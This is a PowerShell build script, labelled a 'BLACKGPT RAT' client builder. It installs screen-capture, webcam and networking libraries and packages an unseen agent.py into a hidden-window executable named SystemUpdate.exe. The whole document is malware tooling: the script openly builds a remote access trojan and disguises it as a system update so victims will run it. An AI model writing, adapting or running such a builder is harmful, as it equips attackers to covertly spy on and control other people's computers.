# BLACKGPT RAT Builder Script
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   BLACKGPT RAT CLIENT BUILDER" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Check Python
try {
    $pythonVersion = python --version 2>&1
    Write-Host "[✓] Python found: $pythonVersion" -ForegroundColor Green
} catch {
    Write-Host "[X] Python not found!" -ForegroundColor Red
    exit 1
}

# Install dependencies
Write-Host "[*] Installing dependencies..." -ForegroundColor Yellow
pip install pillow mss opencv-python requests pyinstaller

# Build
Write-Host "[*] Building RAT client..." -ForegroundColor Yellow
pyinstaller --onefile --noconsole --name=SystemUpdate --clean agent.py

# Check result
if (Test-Path "dist\SystemUpdate.exe") {
    $fileSize = (Get-Item "dist\SystemUpdate.exe").Length
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "   BUILD SUCCESSFUL!" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "[✓] File: dist\SystemUpdate.exe" -ForegroundColor Yellow
    Write-Host "[✓] Size: $([math]::Round($fileSize/1MB, 2)) MB" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "[*] To test: cd dist ; .\SystemUpdate.exe" -ForegroundColor White
} else {
    Write-Host "[X] Build failed!" -ForegroundColor Red
}

pause